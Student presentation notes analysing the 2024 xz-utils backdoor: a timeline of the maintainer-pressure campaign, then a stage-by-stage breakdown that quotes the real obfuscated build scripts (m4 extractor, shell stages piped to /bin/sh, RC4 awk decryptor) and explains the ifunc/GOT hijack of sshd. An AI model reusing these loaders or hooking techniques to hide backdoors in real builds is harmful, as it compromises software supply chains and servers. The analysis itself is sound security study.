# xz exploit notes for prosem presentation

## Timeline
Jan 2021 - @JiaT75 Github account is created

Nov 2021 - Suspicious [PR](https://github.com/libarchive/libarchive/pull/1609) in libarchive
```diff
- safe_fprintf(stderr, "%s",
- archive_entry_pathname(entry));
- safe_fprintf(stderr, ": %s" archive_error_string(a));
+ safe_fprintf(stderr, "%s", archive_entry_pathname(entry));
+ fprintf(stderr, ": %s: ", archive_error_string(a));
+ fprintf(stderr, "%s", strerror(errno));
```

May-Jun 2022 - Discussion about xz maintainer not beeing active, pressure to add Jia Tan as co maintainer (Jigar Kumar, Dennis Ens)

> **Dennis Ens:** Is XZ for Java still maintained?
>
> **Lasse Collin:** Yes, by some definition at least, like if someone reports a bug it will get fixed. Development of new features definitely isn't very active. :-(
<br>[...]<br>
I have lots of unanswered emails at the moment and obviously that isn't a good thing.
<br>[...]<br>
Jia Tan has helped me off-list with XZ Utils and he might have a bigger role in the future at least with XZ Utils. It's clear that my resources are too limited (thus the many emails waiting for replies) so something has to change in the long term.
> 
> **Jigar Kumar:** Progress will not happen until there is new maintainer. [...] The current maintainer lost interest or doesn't care to maintain anymore. It is sad to see for a repo like this.
> 
> **Lasse Collin:** I haven't lost interest but my ability to care has been fairly limited mostly due to longterm mental health issues but also due to some other things.
>
> **Dennis Ens:** I am sorry about your mental health issues, but its important to be aware of your own limits. [...] Why not pass on maintainership for XZ for C so you can give XZ for Java more attention? Or pass on XZ for Java to someone else to focus on XZ for C? Trying to maintain both means that neither are maintained well.
>
> **Lasse Collin:** Finding a co-maintainer or passing the projects completely to someone else has been in my mind a long time but it's not a trivial thing to do. [...]
>
>As I have hinted in earlier emails, Jia Tan may have a bigger role in the project in the future. He has been helping a lot off-list and is practically a co-maintainer already. :-) [...] In any case some change in maintainership is already in progress at least
for XZ Utils.
>
> <cite>https://www.mail-archive.com/xz-devel@tukaani.org/msg00563.html</cite>

> **Jia Tan:** [...] The next alpha release should be coming this year so I don't think it will be as long as you think until it is in a stable release. The contributors to this project are hobbyists so we can't dedicate 40+ hours a week for fast releases of high quality. Thank you for your understanding and if you want to help work on anything you can always submit a patch :)
>
> **Jigar Kumar:** Patches spend years on this mailing list. 5.2.0 release was 7 years ago. There is no reason to think anything is coming soon.
>
> <cite>https://www.mail-archive.com/xz-devel@tukaani.org/msg00557.html</cite>

Jan 2023 - Jia Tan merge their first [PR](https://git.tukaani.org/?p=xz.git;a=commit;h=6fd39664de47801e670a16617863196bfbde4755) in [xz-utils](https://git.tukaani.org/?p=xz.git)

Mar 2023 - [oss-fuzz](https://github.com/JiaT75/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd#diff-39c0471b96b446891cf6e744456854c57f9e98339fec1a5d4cde1cffcb6623ab) contact for xz updated

```diff
homepage: "https://tukaani.org/xz/"
language: c++
-primary_contact: "lasse.collin@tukaani.org"
+primary_contact: "jiat0218@gmail.com"
auto_ccs:
+  - "lasse.collin@tukaani.org"
  - "bshas3@gmail.com"
fuzzing_engines:
  - libfuzzer
@@ -11,4 +12,4 @@ sanitizers:
  - address
  - memory
  - undefined
-main_repo: 'https://git.tukaani.org/xz.git'
+main_repo: 'https://github.com/tukaani-project/xz.git'
```
Jun 2023 - ifunc added by [this](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ee44863ae88e377a5df10db007ba9bfadde3d314) commit.
Original commit was made by [Hans Jansen](https://github.com/tukaani-project/xz/pull/53). This account has not much activity before and after this pr on github

Jul 2023 - [issue](https://github.com/google/oss-fuzz/pull/10667https://github.com/google/oss-fuzz/pull/10667) in oss-fuzz to disable ifunc support for xz - maybe used to mask futher activities but maybe just harmless fix

Feb 2024 - [PR](https://github.com/google/oss-fuzz/pull/11587/files) in oss-fuzz to change homepage from "https://tukaani.org/xz/" (hosted by finish hosting provider) to "https://xz.tukaani.org/xz-utils/" (github pages)

Feb 2024 - build-to-host.m4 added to .gitignore (https://git.tukaani.org/?p=xz.git;a=commit;h=4323bc3e0c1e1d2037d5e670a3bf6633e8a3031e)

Feb 2024 - Binary testing files commited ([first commit](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0), 
[second commit](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6e636819e8f070330d835fce46289a3ff72a7b89))

March 2024 - first voulnerable version of xz 5.6.0 is released - caused valgrid error - fixed in 5.6.1 (https://git.tukaani.org/?p=xz.git;a=commitdiff;h=82ecc538193b380a21622aea02b0ba078e7ade92)

Mar 2024 - Push for inclusion of voulnerable xz package into debian by Hans Jansen (https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708)
Other accounts push for inclusion as well.

Mar 2024 - Jia Tan pushes for inclusion of compromised xz version into Ubuntu (https://bugs.launchpad.net/ubuntu/+source/xz-utils/+bug/2059417) and fedora (https://news.ycombinator.com/item?id=39865810)

Mar 2024 - Andres Freund discovers backdoor and sends email to oss-security mailing list (https://www.openwall.com/lists/oss-security/2024/03/29/4)

Github suspends accounts of Jia Tan and Lasse Collin as well as all [tukaani-project](https://github.com/tukaani-project) repositories.

Lasse Collins reverts changes introduced by Jia Tan

![timeline](assets/timeline.png "timeline")
https://media.infosec.exchange/infosec.exchange/media_attachments/files/112/189/232/249/630/121/original/b5157017fbcebb8d.png

## Technical details

### Overview
Using modified build scripts the first stage of the build process of the malicious binary gets executed. The `build-to-host.m4` file executes code that modifies a binary testing file `bad-3-corrupt_lzma2.xz` in a way that it becomes "uncorrupted". When decompressed, this file contains a shell script that gets executed to start the second phase of the build process.

The shell script from the first phase contains functionality to create another shell script from a second binary test file `good-large_compressed.lzma`. When decompressed it can be seen that the file contains blocks of letters as well as seemingly random data. When removing the blocks of letters, the remaining data can be split into two parts. The first part is the aforementioned shell script that can be derrived by running the data through a caesar cipher. This script can then decode the second part of `good-large_compressed.lzma` which produces an elf binary `liblzma_la-crc64-fast.o`.

The goal of the attac is to change the behaviour of the ssd deamon so that it checks each incomming ssh key for a magic number that, if present, executes code that can be decoded from this special ssh key with the priveledges of the ssh deamon.


### build time
With [GNU Autoconf](https://www.gnu.org/software/autoconf/), make files and build scripts are generated to build for a specific plattform.

![gh_releases](assets/gh_releases.png "gh_releases")

#### [Stage 0](https://gynvael.coldwind.pl/?lang=en&id=782#stage0)
With xz, those files wheren't generated by autoconf and one of the build scripts contained the first stage of the exploit: `m4/build-to-host.m4` ([m4](https://www.gnu.org/software/m4/m4.html) is a macro processor - operates as a text replacement tool). <br>
Orignally it contains a macro that converts between different styles of paths - the modified version in xz extracts the next stage of the exploit, hidden in `tests/files/bad-3-1corrupt_lzma2.xz`. <br>
This supposedly corrupted xz file used for testing is a shell script (see `decoded-bad-3-1corrupt.txt`) with a few characters flipped. This script decodes and executes the next stage of the exploit. 

[build-to-host.m4](https://salsa.debian.org/debian/xz-utils/-/blob/f7c276c144009b4b6ced966a69b7dd2ae3a4b52e/m4/build-to-host.m4):
```
[...]
gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
[...]
gl_path_map='tr "\t \-_" " \t_\-"'
[...]
```
1. `gl_[$1]_config='sed \"r\n\" $gl_am_configmake`: Bytes from tests/files/bad-3-corrupt_lzma2.xz are read from the file and outputted to standard output / input of the next step <br>
`$gl_am_configmake` comes from [here](https://github.com/coreutils/gnulib/blob/8d056c86162dbee3e9203153e836ecee5d0dbedc/m4/configmake.m4#L4).
2. `eval $gl_path_map`: The second step is to run tr (translate, as in "map characters to other characters", or "substitute characters to target characters"), which basically changes selected characters (or byte values) to other characters (other byte values). <br>
Here the `tr` command does the following changes to the `bad-3-corrupt_lzma2.xz` file in order to uncorrupt it:
    - 0x09 (\t) are replaced with 0x20 (whitespace)
    - 0x20 (whitespace) are replaced with 0x09 (\t)
    - 0x2d (-) are replaced with 0x5f (_)
    - 0x5f (_) are replaced with 0x2d (-)
3. `$gl_[$1]_prefix -d 2>/dev/null'`: In the last step of this stage the uncorrupted xz byte stream is extracted with errors being ignored (the stream seems to be truncated, but that doesn't matter as the whole meaningful output has already been written out). The outcome of this is the [Stage 1 script](#stage-1), which is promptly executed.

#### [Stage 1](https://gynvael.coldwind.pl/?lang=en&id=782#stage1)
```bash
####Hello####
# a few binary bytes here, but as it's a comment they are ignorred
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
    eval `grep ^srcdir= ../../config.status`
    srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####
```

1. `[ ! $(uname) = "Linux" ] && exit 0`: Check whether the script is running on linux (why 5x?)

2. `export i=...`: A function "definition" that is invoced later

3. `xz -dc $srcdir/tests/files/good-large_compressed.lzma`: extraction of [stage 2](#stage-2) located in good-large_compressed.lzma to standard output

4. `eval $i`: Invoce the function previously created previously which either skips the next n bytes or outputs them. <br>
`(head -c +1024 >/dev/null)`: The -c +1024 option there tells head to read and output only the next 1024 bytes from the incoming data stream (note that the + there is ignored, it doesn't do anything, unlike in tail). However, since the output is redirected in this case to /dev/null, what we effectively get is "skip the next 1024 bytes". <br>
This is a good moment to note, that if we look at the first 1024 bytes in the uncompressed data stream from the good-large_compressed.lzma file, it's basically the "A" character (byte 0x41) repeated 1024 times. To add a bit of foreshadowing, after the first 1024 characters there is some binary data. <br>
`head -c +2048`: In this case output is not ignored – it will actually be passed to the next step as input. <br>
To visualize this, here's the actual input data that's processed by this set of head calls. Byte 0 is on top-left of the file; each column represents 256 bytes of the file as grayscale. Note the "empty gray" regions between the high entropy ("noisy") areas – what this part of the script does is basically just removing the empty regions and merging the regions with actual data together. <br>
![entropy_chart_good_large_compressed](assets/entropy_chart_good_large_compressed.png "entropy_chart_good_large_compressed")
![stage1_carved.data](assets/stage1_carved.data.png "stage1_carved.data")

5. `tail -c +31233`: In the next step the initial portion of the data is discarded (spoiler: it hides the binary backdoor, which is extracted in the next Stage, so it's not needed now). In 5.6.0 that would be the first 31264 bytes and in the 5.6.1 that's 31232 (the one-off difference is because of tail -c +N means "start outputting from byte N" and not "ignore first N bytes").

6. `tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377"`: Step 5 revisits the tr command, which in this case is used as a very simple substitution cipher. This basically means that (for 5.6.0) byte of value 5 will be substitute with byte of value 0, byte of value 6 will be substituted with byte of value 1, and so on. In each case there are 6 ranges which map to the whole 0 - 255 (that's 377 octal) range.

7. `xz -F raw --lzma1 -dc`: In the last step the deciphered data is decompressed and the resulting [Stage 2](#stage-2) is promptly executed.

#### [Stage 2](https://gynvael.coldwind.pl/?lang=en&id=782#stage2)
The resulting file from the extraction described above was called [injected.txt](https://www.openwall.com/lists/oss-security/2024/03/29/4/1) by Andres Freund in his [email to oss-security](https://www.openwall.com/lists/oss-security/2024/03/29/4). It contains the compilation process modification code.

From the perspective of obfuscation analysis, there are three interesting fragments to this script, two of which appear only in the 5.6.1 version. Let's start with them, as they are also simpler.

##### Stage 2 "extension" mechanism (just interesting detail, not important)
Fragment 1:
```bash
vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
    f1=`echo $vs | cut -d: -f1`
    if test "x$f1" != "x" > /dev/null 2>&1;then
        start=`expr $(echo $vs | cut -d: -f2) + 7`
        ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
        if test "x$ve" != "x" > /dev/null 2>&1;then
            f2=`echo $ve | cut -d: -f1`
                if test "x$f2" != "x" > /dev/null 2>&1;then
                    [ ! "x$f2" = "x$f1" ] && exit 0
                    [ ! -f $f1 ] && exit 0
                    end=`expr $(echo $ve | cut -d: -f2) - $start`
                    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
                fi
            fi
        fi
    fi
fi
```

Fragment 3:
```bash
vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
    f1=`echo $vs | cut -d: -f1`
    if test "x$f1" != "x" > /dev/null 2>&1;then
        start=`expr $(echo $vs | cut -d: -f2) + 7`
        ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
        if test "x$ve" != "x" > /dev/null 2>&1;then
            f2=`echo $ve | cut -d: -f1`
            if test "x$f2" != "x" > /dev/null 2>&1;then
                [ ! "x$f2" = "x$f1" ] && exit 0
                [ ! -f $f1 ] && exit 0
                end=`expr $(echo $ve | cut -d: -f2) - $start`
                eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
            fi
        fi
    fi
fi
```
These two fragments are pretty much identical, so let's handle both of them at the same time. Here's what they do:

1. `grep -broaF`: First of all they try to find two files in tests/files/ directory which contain the following bytes (signature)
    ```
    Fragment 1: "~!:_ W" and "|_!{ -"
    Fragment 3: "jV!.^%" and "%.R.1Z"
    ```
    Note that what's actually outputted by grep in this case has the following format: `file_name:offset:signatur`. <br>
    For example:
    ```
    $ grep -broaF "XYZ"
    testfile:9:XYZ
    ```

2. `f1=echo $vs | cut -d: -f1`: If such file is found, the offset for each file is extracted (cut -d: -f2, which takes the 2nd field assuming ':' is the field delimiter) and the first offset + 7 is saved as $start, and the second offset from the second file is saved as $end.

3. Once the script has the `$start` and `$end` offsets, it carves out that part of the file that had the first signature:
    ```bash
    cat $f1 | tail -c +${start} | head -c +${end}
    ```

4. And what follows is first the substitution cipher (using the 5.6.0 version key from Stage 1 btw):
    ```bash
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"
    ```

5. and then decompressing the data for it to be promptly executed:
    ```bash
    eval `... | xz -F raw --lzma2 -dc`
    ```

Note that in neither of the investigated TAR archives (5.6.0 and 5.6.1) there weren't any files with any of the signatures. This whole thing basically looks like an "extension/patching" system that would allow adding future scripts to be run in the context of Stage 2, without having to modify the original payload-carrying test files. Which makes sense, as modyfing a "bad" and "good" test files over and over again is pretty suspicious. So the plan seemed to be to just add new test files instead, which would have been picked up, deciphered, and executed.

##### Stage 2 backdoor extraction
As pointed out by Andres in the original e-mail, at some point an .o file is extracted and weaved into the compilation/linking process. The following code is responsible for that:

```bash
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
```

1. The first step is identical as step 2 in [Stage 1](#stage-1) – the `tests/files/good-large_compressed.lzma` file is being extracted with xz.

2. Second step is in turn identical as step 3 in [Stage 1](#stage-1) – that was the "a lot of heads function" invocation.

3. And here is where things diverge. First of all, the previous output get's mangled with the sed command:
    ```bash
    LC_ALL=C sed "s/\(.\)/\1\n/g"
    ```
    What this does, is actually putting a newline character after each byte (with the exception of the new line character itself). So what we end up with on the output is a byte-per-line situation (yes, there is a lot of mixing "text" and "binary" approaches to files in here). This is actually needed by the next step.

4. The next step is an AWK script (that's a simple scripting language for text processing) which does the decryption of the input stream:
    ```AWK
    BEGIN {  # Initialization part.
        FS = "\n";  # Some AWK settings.
        RS = "\n";
        ORS = "";
        m = 256;
        for(i=0;i<m;i++) {
            t[sprintf("x%key", i)] = i;
            key[i] = ((i * 7) + 5) % m;  # Creating the cipher key.
        }
        i=0;  # Skipping 4096 first bytes of the output PRNG stream.
        j=0;  # ↑ it's a typical RC4 thing to do.
        for(l = 0; l < 4096; l++) {  # 5.6.1 uses 8192 instead.
            i = (i + 1) % m;
            a = key[i];
            j = (j + a) % m;
            key[i] = key[j];
            key[j] = a;
        }
    }

    {  # Decryption part.
        # Getting the next byte.
        v = t["x" (NF < 1 ? RS : $1)];

        # Iterating the RC4 PRNG.
        i = (i + 1) % m;
        a = key[i];
        j = (j + a) % m;
        b = key[j];
        key[i] = b;
        key[j] = a;
        k = key[(a + b) % m];

        # As pointed out by @nugxperience, RC4 originally XORs the encrypted byte
        # with the key, but here for some add is used instead (might be an AWK thing).
        printf "%key", (v + k) % m
    }
    ```

5. After the input has been decrypted, it gets decompressed:
    ```bash
    xz -dc --single-stream
    ```

6. And then bytes from N (0) to W (~86KB) are being carved out using the same usual head tricks, and saved as liblzma_la-crc64-fast.o – which is the final binary backdoor.
    ```bash
    ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o
    ```

The resulting `liblzma_la-crc64-fast.o` get's used in the linking section to inject the malicious code into the sshd service.

### [link time](https://www.youtube.com/watch?v=Q6ovtLdSbEA)
The goal for the attack is to hijack the ssh deamon to be able to execute commands as if the attacker is the sshd process on the targetet machine.

<image src="assets/normal_ssh.png" width="500px" />
<image src="assets/hijacked_ssh.png" width="500px" />

To achive this, the `liblzma_la-crc64-fast.o` files interferes with the dynamic linker to get the sshd to execute malicious code.
<image src="assets/stack_replace_rsa.png" height="500px" />

#### GNU indirect functions (ifunc)

The `.text` section of the sshd process cannot be overwritten. But for function calls, the global offset table `.got` stores the location of external functions and since these functions are linked in dynamically, the `.got` needs to be writable at least some of the time during execution.
<image src="assets/stack_got.png" height="500px" />

This aproach has two challenges:
- RELRO (relocation read only) is a security feature that forces the linker to resolve all of the functions and imediatly and mark the `.got` section as read only afterwards to address this issue
- to be able to modify the `.got`, some code of the shared library needs to be executed but that usually only happens if sshd calls the library

Using GNU indirect functions (IFUNC) both of these problems can be overcome. IFUNC is a feature that allows the developer of a library to specify different implementations of the same function and decide during the linking process which implementation to choose (e.g. based on the availability of hardware accelerators). <br>
The resolver is called during the linking process when the `.got` segment is not marked as read only. In the resolver function, arbitrary code can be executed.

```c
/* Function pointer for the implementation of the 'crc64' function */
typedef uint64_t (*crc64_func_type)(
		const uint8_t *buf, size_t size, uint64_t crc);

/* 
 * Function prototype for the 'crc64' function
 * Attribute marks 'crc64_resolve' as the resolver function to pick an implementation
 */
uint64_t lzma_crc64(const uint8_t *buf, size_t size, uint64_t crc)
		__attribute__((__ifunc__("crc64_resolve")));

/* Function to resolve the implementation of crc64 at runtime */
static crc64_func_type crc64_resolve(void)
{
	return is_clmul_supported() ? &crc64_clmul : &crc64_generic;
}
```
https://github.com/tukaani-project/xz/blob/f1cd9d7194f005cd66ec03c6635ceae75f90ef17/src/liblzma/check/crc64_fast.c

#### Runtime Dynamic Linker Audit Hooks

When using ifunc, the `.got` can be modified. However, `liblzma.so` is resolved before `libcrypto.so` and the linker just overrides the modified addres of the `RSA_public_decrypt()` function once `libcrypto.so` get's linked.

To solve this, [rtdl-audit hooks](https://www.man7.org/linux/man-pages/man7/rtld-audit.7.html) are used which allow to trace the linking process by specifying a callback function on certain linking steps. <br>

<image src="assets/stack_rtdl_audit.png" height="500px" />

The ifunc then sets up the function pointer in `ld-linux.so` to point to `backdoor_setup()` which then handles the overriding of the `.got` segment in `sshd`. This works because the `backdoor_setup()` function can be configured to be called after `libcrypto.so` is linked.

#### Resolving memory addresses "by hand"

To accomplish the tasks of overriding certain memory segments, the code needs to know what the memory address of the `.got` segment of sshd 

### run time

## Demo